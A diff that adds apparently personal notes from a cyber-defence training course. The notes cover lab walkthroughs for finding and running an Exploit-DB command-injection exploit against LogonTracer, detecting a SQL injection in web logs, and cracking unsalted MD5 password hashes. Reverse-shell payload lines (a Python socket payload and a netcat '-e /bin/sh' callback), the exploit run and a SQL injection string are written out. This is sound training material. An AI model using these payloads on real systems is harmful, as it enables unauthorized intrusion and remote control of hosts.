@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/98b78774-4ff3-405a-9aef-e72d52e27214)########## M6 L1 ############
+![image](https://github.com/user-attachments/assets/bf9a5c0a-0063-4575-82e7-818ba119c1e4)![image](https://github.com/user-attachments/assets/98b78774-4ff3-405a-9aef-e72d52e27214)########## M6 L1 ############
 ######### Harvesting Credentials ###########
 
 Workflow
@@ -1625,6 +1625,515 @@ Which other accounts received emails like that of Karen Smith?
 
 
 -----------------------------------------------------------
+
+########## M7 L2 ############
+######### Finding and Using an Exploit ###########
+
+
+Workflow
+
+
+1. Log in to the kali-hunt Virtual Machine (VM) using the provided credentials:
+Username: trainee
+Password: CyberTraining1!
+
+
+
+2. Open a terminal.
+
+
+Recall that to get a list of running services, a port scan is conducted, which usually includes service versioning.
+
+
+3. Run the following command to conduct a port scan as well as gather more information about the service version and potential Operating System (OS) version against the first host while skipping host discovery. Using sudo prompts for a password, which is CyberTraining1!.
+(trainee@dmss-kali)-[~] $ sudo nmap -sS -sV -Pn -O 200.200.200.10
+
+
+
+![image](https://github.com/user-attachments/assets/c6f693ae-bac4-4f58-8509-dc403d0642bf)
+
+
+
+Figure 7.2-1
+
+
+Sometimes, Nmap prints more output from Transmission Control Protocol (TCP)/Internet Protocol (IP) stack fingerprinting from OS detection. The determination for the OS is still the same. 
+
+
+Based on the scan results, a possible Ubuntu OS with Secure Shell (SSH) and Hypertext Transfer Protocol (HTTP) is open. The SSH version is OpenSSH 8.2p1 and the HTTP server is Werkzeug HTTP Daemon (HTTPD) with a version of 0.14.1. SSH is running on the standard port, and HTTP is running on alternate port 8080 versus port 80.
+
+
+Note that while the results of the OS detection were inconclusive (only returning Linux rather than the specific distribution), the service versioning returned more specific information regarding the OS. This is because Nmap uses different probes while performing service versioning and OS detection.
+
+
+If there are no operational security concerns related to security products in the network, then more information is better — which is why -sV (probe for service/version info) and -O (OS detection) were both used despite returning different data.
+
+
+Exploits may or may not be OS — and service version — specific, so gathering as much information as possible is important.
+
+
+Since there is a web server running on the 200.200.200.10 host, gather additional information about what may be hosted on the server by visiting the webpage. There is a variety of web applications that have further vulnerabilities on top of the underlying web server software. For example, website content managers such as WordPress and Drupal have introduced several vulnerabilities that enabled attackers to conduct arbitrary remote code execution.
+
+
+4. Open Firefox and visit the following webpage:
+http://200.200.200.10:8080
+
+
+
+The web application that has been imported into the range relies on resources on the internet that are not accessible in the range. This is why the page does not render properly in the environment.
+
+
+![image](https://github.com/user-attachments/assets/7fe91cb0-a02a-4aaf-a27b-e75cca3cf8a0)
+
+The application running on the webserver is something called LogonTracer. However, no software version is available.
+
+
+At this point in time, the following leads for software to search for an exploit are available:
+OpenSSH 8.2
+Wekzeug HTTPD 0.14.1
+LogonTracer unknown software version
+
+This is enough information to begin searching Exploit-DB for exploits. Kali Linux has a CLI that allows users to search exploits in Exploit-DB. A local copy of Exploit-DB is maintained, so for the newest exploits, the database may require an update. This can be accomplished by running the following command:
+searchsploit -u
+
+
+
+NOTE: Internet connectivity is needed for this to work, so this is not performed in this lab.
+
+
+5. View the help menu for SearchSploit to get a general usage idea of the utility by running the following command:
+(trainee@dmss-kali)-[~] $ searchsploit -h
+
+![image](https://github.com/user-attachments/assets/d5a95c18-c249-425e-8252-fd7774e7ea00)
+
+
+The syntax is simple and reasonably straightforward. For the searches in the following steps, do not use any switches.
+
+
+6. Run the following command to search for exploits related to OpenSSH:
+(trainee@dmss-kali)-[~] $ searchsploit openssh
+
+
+![image](https://github.com/user-attachments/assets/668293fe-a74f-49a1-af9d-8cb28e535fcb)
+
+
+There does not seem to be a viable OpenSSH exploit for the current software version — 8.2. For reference, knowing what to look for depends on what is being attempted. To gain access to the system, look for something that enables command execution, whereas to ensure that a host had a failover system in place, then look for a Denial of Service (DoS). To see if the systems can be remotely accessed and execute the desired commands, good exploit candidates would have the following attributes:
+Matching software
+Matching software version
+Matching OS (if applicable)
+If the exploit must be done over the network, then remote somewhere in the exploit title or path
+May allude to Code Execution or Command Execution
+May allude to being Unauthenticated, as there are no credentials to use.
+
+7. Run the following command to search for exploits related to Wekzeug HTTPD:
+(trainee@dmss-kali)-[~] $ searchsploit wekzeug
+
+![image](https://github.com/user-attachments/assets/8e0de26c-5746-4de3-9ae1-670f6932dcaf)
+
+
+Once again, there are no viable results.
+
+
+8. Run the following command to search for exploits related to LogonTracer:
+(trainee@dmss-kali)-[~] $ searchsploit logontracer
+
+![image](https://github.com/user-attachments/assets/a4b920a2-0ea7-4f00-a449-81e796e0a68d)
+
+
+There is an exploit present for the software, though unfortunately, the version is unknown. This is a good time to read the exploit to see if it can be used. Notice the partial path provided — multiple/webapps/49918.py. The filename — 49918.py — is also the exploit ID. Make note of the exploit ID for the next step. 
+
+
+9. Run the following command to find the full path of the exploit. -p specifies the full path given an exploit ID and copies it to the clipboard, if possible.
+(trainee@dmss-kali)-[~] $ searchsploit -p 49918
+
+
+![image](https://github.com/user-attachments/assets/3652d1b2-739e-4e79-9d65-899e5b4f66c1)
+
+The full file path — as shown from the results of the command — is /usr/share/exploitdb/exploits/multiple/webapps/49918.py. CDAs should always look at the exploit before using it for a few reasons such as:
+Finding usage instructions
+Finding out more information about what the exploit is actually doing
+Making modifications to the exploit script
+Ensuring that there is no malicious code in the exploit
+
+10. Run the following command to read the exploit script:
+(trainee@dmss-kali)-[~] $ less -N /usr/share/exploitdb/exploits/multiple/webapps/49918.py
+
+![image](https://github.com/user-attachments/assets/f710fb11-82dd-4fca-8b01-60ccc46af464)
+
+
+
+From lines 13–16, the user needs to provide the attacker's IP address, attacker's port, and the Uniform Resource Locator (URL) to the victim.
+
+
+From lines 22–29, it is evident that it is a command injection vulnerability that is being exploited, which sends back a shell to an attacker's listener.
+
+
+Keep in mind, it is not necessary to understand everything that is happening in the script, just a general idea of what it is doing. There is no need for an in-depth code review.
+
+
+11. Run the following command to print the exploit script's help menu:
+(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py -h
+
+![image](https://github.com/user-attachments/assets/8cc2b5ab-ff38-4f2d-8ec4-3195e48b6226)
+
+Now the syntax of the command is known.
+
+
+12.  Start a listener before running the exploit, as the exploited host needs something to call back to. The port is somewhat arbitrary. In this case, 4444 is used.
+(trainee@dmss-kali)-[~] $ nc -nlvp 4444
+
+![image](https://github.com/user-attachments/assets/cb7ea7ab-c207-40b7-b626-e56228fe5ce5)
+
+13. Open a new tab or window, and run the following command to run the exploit:
+(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py 199.63.64.51 4444 http://200.200.200.10:8080
+
+![image](https://github.com/user-attachments/assets/bd3fb75e-a2e4-4f38-a07b-51fb7266d17d)
+
+The output states If the terminal hangs, you might have a shell. Since the terminal hangs immediately after sending the exploit, this is a good sign.
+
+
+14. Switch back to the other terminal where Netcat was running.
+
+
+![image](https://github.com/user-attachments/assets/2bafe7e5-f60a-4ac4-b3bd-656e4632b5d5)
+
+
+A shell was received from the exploited host. Notice that a few seemingly random characters are returned in the prompt as well. These are escape codes, which are responsible for formatting text that is typically seen when entering text into a terminal and do not affect running commands.
+
+
+15. Run a command to check the functionality of the shell.
+(trainee@dmss-kali)-[~] $ /usr/local/src/LogonTracer # whoami
+
+![image](https://github.com/user-attachments/assets/72022864-43ac-47cf-8d56-69a69f57288f)
+
+The shell appears to be in working order, and notice you are the root user on the victim host.
+
+
+16. Enter exit to exit the shell.
+
+----------------------------------------
+
+Making Modifications to a Script to Suit the Target Environment
+The exploit script was examined in step 9, and no modifications were needed.
+
+﻿
+
+Workflow
+
+﻿
+
+NOTE: The following steps continue from the previous steps.
+
+﻿
+
+17. View the exploit script again by running the following command:
+
+(trainee@dmss-kali)-[~] $ less -N /usr/share/exploitdb/exploits/multiple/webapps/49918.py
+﻿
+
+Focus attention to line 22:
+
+![image](https://github.com/user-attachments/assets/eb9d4b9d-5378-40db-9afc-f949a5cb8759)
+
+
+
+
+A Python command is injected, which creates a socket to the provided IP address and port. A shell is then attached to it. This may be problematic in different environments due to the fact that Python is not installed on many hosts. The payload may end up doing nothing in those circumstances — it is not an issue in this case as LogonTracer is actually written in Python. With different exploits, the script may need to be edited to work properly.
+
+
+18. Make a copy of the script before making modifications:
+(trainee@dmss-kali)-[~] $ cp /usr/share/exploitdb/exploits/multiple/webapps/49918.py .
+
+
+
+19. Open the copy of the exploit script in the Vim editor:
+(trainee@dmss-kali)-[~] $ vim 49918.py
+
+
+
+20. Enter i to start the edit mode, then change the contents of the 22nd line beginning with PAYLOAD from:
+PAYLOAD = f"python -c 'import pty,socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{ATTACKER_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+
+
+
+to:
+PAYLOAD = f"/usr/bin/nc {ATTACKER_IP} {ATTACKER_PORT} -e /bin/sh"
+
+![image](https://github.com/user-attachments/assets/1a15b470-ca92-493d-8739-d5aeb8bb87b6)
+
+
+Since Netcat comes installed by default on many distributions more frequently than Python, this may increase the chances of an exploit working. The Python command was replaced with a Netcat command which executes /bin/sh and sends it to the attacker's listener.
+
+
+21. Select the Escape key and enter :wq to write the changes and quit Vim.
+
+
+22. Start the listener again before running the exploit.
+(trainee@dmss-kali)-[~] $ nc -nlvp 4444
+
+![image](https://github.com/user-attachments/assets/9bd227b3-0161-4717-be1d-f4d1221993f1)
+
+23. Run the modified exploit script in a different window or tab:
+(trainee@dmss-kali)-[~] $ python3 49918.py 199.63.64.51 4444 http://200.200.200.10:8080
+
+![image](https://github.com/user-attachments/assets/4d618cdc-ddb2-4f64-a280-0536c8e8314b)
+
+Once again, the terminal hangs, which is a good sign.
+
+
+24. Switch over to the terminal that had Netcat running.
+
+![image](https://github.com/user-attachments/assets/1aff7ba7-f741-4d99-a7fb-da5cc48d5d42)
+
+A connection was established from the exploited host.
+
+
+25. Verify shell functionality with the following command:
+whoami
+
+![image](https://github.com/user-attachments/assets/e9bb2e60-b2eb-4d07-a3e3-f310983ecc90)
+
+26. Exit the shell by entering the exit command.
+
+
+This lab exercise provided the opportunity to find exploits using Exploit-DB and SearchSploit and make minor modifications to an exploit script. These steps are similar to actions attackers undertake when selecting and using an exploit.
+
+
+
+----------------------------------------------
+
+Scenario
+The mission partner has an internet-facing host. The supported commander wanted to ensure that it was secured against unauthorized external access. The CPT has been tasked to verify that the internet-facing host is secure. Use the provided kali VM to investigate the mission partner's system.
+
+Internet Host: 190.13.1.9
+1. Log in to the kali-hunt VM using the provided credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+![image](https://github.com/user-attachments/assets/5488aed9-65cc-4e8e-a3b8-79592605d845)
+
+![image](https://github.com/user-attachments/assets/623a3334-334c-4881-b6d7-9c0064cecebb)
+
+-----------------------------------------------
+
+![image](https://github.com/user-attachments/assets/54bd0e2f-1fd4-4067-9bc2-9a7a99954128)
+
+
+![image](https://github.com/user-attachments/assets/5afaf3aa-c0b4-495e-be0c-08d0ad90ba46)
+
+
+------------------------------------------
+
+![image](https://github.com/user-attachments/assets/4e929b9c-4180-4bb5-925c-5be723c96230)
+
+
+![image](https://github.com/user-attachments/assets/a7db80a0-5f01-497f-9e1a-73cf45d98991)
+
+-------------------------------------
+
+
+![image](https://github.com/user-attachments/assets/c5fd3802-af4e-48f1-9b77-eb0fb111a24d)
+
+![image](https://github.com/user-attachments/assets/f5e3192e-14d0-4009-b814-7c9171da243b)
+
+![image](https://github.com/user-attachments/assets/cdea9247-919e-4886-a503-d59c311d85dc)
+
+-----------------------------------
+
+############## CDAH-M7L3 Web Application Attacks ##############
+
+
+CDAH-M7L3 Web Application Attacks
+
+ look for union in certain logs
+
+search for UNION+SELECT
+![image](https://github.com/user-attachments/assets/0447e933-1ad4-4384-82cc-db9f5592d149)
+
+Operators in SQL use characters to manipulate and find data within the database. A common operator that is utilized in an SQLI attack is UNION. The UNION operator is used in SQL to combine two or more SELECT statements. Additionally, the UNION operator can be used to retrieve data from multiple tables within a database. The UNION operator can help the adversary discover table s, columns,  users, and file paths. 
+
+also search for script and get time stamp
+
+![image](https://github.com/user-attachments/assets/21dac7be-1a4b-43a2-9f11-b812367e8cbc)
+
+
+![image](https://github.com/user-attachments/assets/fb413ff3-19b2-4871-b637-4b0c5406cb85)
+
+![image](https://github.com/user-attachments/assets/a9d396e2-226a-489b-a198-6993424be159)
+
+
+
+![image](https://github.com/user-attachments/assets/fae52e80-3474-40e9-9636-c0e20490ea1e)
+
+
+![image](https://github.com/user-attachments/assets/0b048432-e84c-4c85-b6eb-dca6fe9b9567)
+
+![image](https://github.com/user-attachments/assets/5a50dbea-4301-4297-904d-88933600caaf)
+
+
+![image](https://github.com/user-attachments/assets/874b775c-34ba-48f6-8dbe-786c2a6b402f)
+
+![image](https://github.com/user-attachments/assets/3dd4c9a2-a67f-4a2f-a2bd-449ac9389932)
+
+![image](https://github.com/user-attachments/assets/1bad4db4-39e3-4bc2-985a-dd73231d6a97)
+
+![image](https://github.com/user-attachments/assets/a31ad09d-68e1-41bb-8323-57b0e8034fc4)
+
+SQLI 12:39:14 Attack Query
+The following query was executed by the adversary:
+
+'UNION ALL SELECT current_user(),user() #
+﻿
+
+NOTE: The use of the ', UNION, and # should immediately tip off the analyst. As demonstrated and discussed throughout the lesson, these characters are used to exploit a web application's design and gain access to otherwise protected information.  
+
+![image](https://github.com/user-attachments/assets/6a87e0ae-bcc7-4d95-b563-a95b1279b3df)
+
+Information Obtained
+The SQLI attack on the network helped the adversary gain information about the current database user. This information contains portions of the user's credentials. The credential information obtained may lead the adversary to perform other types of attacks in an attempt to break into the user's account. To mitigate this attack, measures to sanitize input in the network application portal must be enacted. 
+
+--------------------------------------------------
+
+########### CDAH-M7L4 Stack Exploitation ############
+
+Hashing Scenario
+
+Workflow
+
+
+1. Log in to the kali-hunt Virtual Machine (VM) using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+
+
+The mission partner provided a copy of the script used to create the user and password hashes, which are written in Python.
+
+
+2. View the following script which defines the methods for generating the password file and the main method:
+(trainee@dmss-kali)-[~] $ less -N ~/m2l5/hashing/create_hash.py
+
+![image](https://github.com/user-attachments/assets/1b930854-3f1e-4e7b-8a40-772ff79743cf)
+
+The code has a very straightforward purpose. Looking at the main method, it takes user input and creates a line in the passwd file. In the create_hash() method, the hashing algorithm used is MD5. MD5 is considered a cryptographically insecure algorithm. To be cryptographically secure, a hashing algorithm must meet three requirements:
+The algorithm must be preimage-resistant.
+The algorithm must be second preimage-resistant.
+The algorithm must be collision-resistant.
+
+What does this mean? First, start with the definition of a preimage. A preimage is a set of all the data that results in the same hash.
+
+
+The MD5 algorithm produces a hash that is 16-bytes/128-bits long. There is an infinite number of possible inputs, but MD5 only has 2^128 possible combinations; some inputs result in the same hash. This phenomenon is known as the pigeonhole principle, which is demonstrated in Figure 7.5-5. This means that within a given hash table size (number of containers), when that size is exceeded, some inputs do not have a unique output (container). These inputs share the same resultant hash as a different input. In other words, if you have more pigeons than containers, more than one pigeon needs to share the same container.
+
+
+![image](https://github.com/user-attachments/assets/a5da6a5c-9341-440f-a2f0-fdc36d278128)
+
+
+A preimage-resistant hash means it is very difficult to find a single item in the preimage. In terms of the pigeon example, this can be thought of as not being able to guess where the pigeons plan to roost. This effectively makes the hash irreversible. To be second preimage-resistant, provided there is a single item in the preimage, it is still extremely difficult to find a second item in the preimage. This effectively means that there is no discernable pattern in the preimage items. According to the pigeon example, it would be hard to guess which pigeons roost together.
+
+
+Collision-resistant states that it is difficult to find any two arbitrary inputs that produce the same hash. Due to a principle known as the birthday paradox, finding any two inputs that result in the same hash should take 2^64 attempts for MD5. However, since MD5 is not collision-resistant, it takes significantly fewer attempts and is doable in a reasonable amount of time. This is why MD5 is known to be cryptographically insecure and should not be used as a cryptographic algorithm. MD5 may still be used for error checking, however, software publishers often publish an MD5 along with their software to enable the user to check for download integrity. Additionally, MD5 may still be used as a Hash-based Message Authentication Code (HMAC) for its usage as a Pseudo-Random Number Generator (PRNG).
+
+
+Sounds like a lot of complex requirements just to store passwords, right? That's because it is. Never use custom-built hashing algorithms for production usage; even thoroughly vetted algorithms tested and evaluated by expert committees can be found to be insecure years later. Always follow recommended guidelines and practices recommended by the experts.
+
+
+A recommendation that can be made to the mission partner to improve security is to use a cryptographically secure algorithm to store password hashes. Some cryptographically secure algorithms recommended for storage are Secure Hashing Algorithm (SHA) 2 and SHA3.
+
+
+3. Execute the following script to see what happens:
+
+(trainee@dmss-kali)-[~] $ python3 ~/m2l5/hashing/create_hash.py
+
+![image](https://github.com/user-attachments/assets/daf3da44-59c5-44ed-acaf-6c410128e144)
+
+
+
+The program prompts for a username.
+
+
+4. Enter test for the username and password when prompted for the password.
+
+![image](https://github.com/user-attachments/assets/0c78e10e-0e41-4a55-a8b6-e5ba371d04f9)
+
+After selecting Enter, the script states that the user has been created successfully.
+
+![image](https://github.com/user-attachments/assets/4547570c-a377-4267-b134-a88f8f9a6100)
+
+The passwd file is created in the current directory.
+
+
+5. View the contents of the passwd file by running the following command:
+(trainee@dmss-kali)-[~] $ cat passwd
+
+![image](https://github.com/user-attachments/assets/2bd3067d-b551-48a6-85c2-378424e51474)
+
+Notice that the username and password are stored in a username:password format. Presumably, this data would be used to authenticate users into other applications.
+
+
+The mission partners also provided their password file for the CPT's analysis.
+
+
+6. View their passwd database by running the following command:
+(trainee@dmss-kali)-[~] $ less ~/m2l5/resources/passwd
+
+![image](https://github.com/user-attachments/assets/25819e07-1c25-4ffe-8a60-5933045aa422)
+
+Immediately, notice that three users have the same password: lmadison, tbooker, and malexander, as their password hashes all match. Apart from the lack of password complexity issue, which allows users to come up with the same password covered in previous lessons, storing passwords in a manner where the same password generates the same hash is also bad practice. The reason is demonstrated in the next steps.
+
+
+7. Copy the file hash shared by the three users and navigate to crackstation.net on the workstation to look up the hash.
+
+![image](https://github.com/user-attachments/assets/ae9fcbff-9918-4956-a6b9-9c0c71394741)
+
+There is a match! The password for the three users is monkey. The site used contains a database known as a rainbow table, which is a set of precomputed hashes for a wordlist. Having a rainbow table enables attackers to rapidly conduct a lookup rather than computing the hash of every password in a wordlist. As all hashing algorithms generate the same data every time for the same data, all hashing algorithms are susceptible to rainbow table attacks, even if they are cryptographically secure.
+
+
+To defeat rainbow table attacks, practice hash salting. A salt is a known value that is added to the user's password before hashing to change to the resulting hash. Ideally, each salt is unique per hash. If the same salt is used, while it probably defeats a rainbow table, users are still using the same password if they are using the same salt because the hash has not changed. Once the salt is calculated — different applications do this differently — it is stored with the password hash.
+
+
+An example of a rudimentary salt is the username and a timestamp. Try this in the next step.
+
+
+8. Execute the following command to ensure that the password that the three users share is monkey:
+
+(trainee@dmss-kali)-[~] $ echo -en 'monkey' | md5sum
+
+![image](https://github.com/user-attachments/assets/96c2a8ff-d16e-4c32-814f-8a93a1d14f20)
+
+The hash is the same as in the password database file.
+
+
+9. Append a salt, one of the usernames and a timestamp, to the password and hash the concatenated string.
+
+
+NOTE: Single quotes are not needed. They are there to make the different parts appended to the password clearer. monkey is the password portion, lmadison is the username, and the command $(date "+%F_%R") appends a current timestamp. Therefore, the hash generated when executing this command is different.
+(trainee@dmss-kali)-[~] $ echo -en 'monkey''lmadison'$(date "+%F_%R") | md5sum
+
+![image](https://github.com/user-attachments/assets/0dc39ab4-b697-41d7-b1f5-ab66b1380358)
+
+The new hash is ea5e08fee66cca7f8d19fe0f98c59e19 in this example. The hash is different.
+
+
+10. Copy the new hash and attempt another rainbow table attack.
+
+![image](https://github.com/user-attachments/assets/0fa38874-4e90-4534-bdfd-b6bc2d89eb7d)
+
+This time there is no match for the password, despite being an e xtremely weak pa ssword. The salt is stored with the password hash for future use. In this case, the timestamp may be stored in the database in the ACCOUNT_CREATION_TIME field in the same file. When running the hash algorithm again, the username and the ACCOUNT_CREATION_TIME is added to the password before hashing.
+
+---------------------------------------------
+
+
+
+
+
+
+
+
+
+
 
 
 
